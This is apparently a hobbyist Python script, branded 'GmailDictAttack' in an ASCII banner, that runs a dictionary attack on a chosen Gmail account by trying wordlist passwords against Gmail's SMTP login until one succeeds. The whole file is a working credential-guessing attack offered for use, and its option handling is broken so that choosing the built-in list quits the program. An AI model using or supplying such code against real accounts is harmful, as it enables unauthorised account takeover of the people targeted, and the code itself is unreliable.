import smtplib
from os import system

def logo():
    print(" ________               .__.__  ________  .__          _____   __    __                 __      ")
    print(" /  _____/  _____ _____  |__|  | \______ \ |__| ____   /  _  \_/  |__/  |______    ____ |  | __ ")
    print("/   \  ___ /     \\__  \ |  |  |  |    |  \|  |/ ___\ /  /_\  \   __\   __\__  \ _/ ___\|  |/ / ")
    print("\    \_\  \  Y Y  \/ __ \|  |  |__|    `   \  \  \___/    |    \  |  |  |  / __ \\  \___|    <  ")
    print(" \______  /__|_|  (____  /__|____/_______  /__|\___  >____|__  /__|  |__| (____  /\___  >__|_ \ ")
    print("        \/      \/     \/                \/        \/        \/                \/     \/     \/ ")
    print("}--------------- coded by DaRk ---------------{")

logo()

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter Target (Gmail Adress): ")

pwd = input("Enter 0 if you want to use the inbuilt basic wordlist of passwords, enter 1 if you want to use your own:")

if pwd == "0":
    passswfile="inbuiltpasslist.txt"

if pwd == "1":
    passswfile = input("Path of your passlist: ")
else:
    print("You did not Enter 0 nor 1 as a penalty you will now restart the whole porcess!")
    quit()

passswfile = open(passswfile, "r")

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] Pasword Is Wrong. %s " % password)
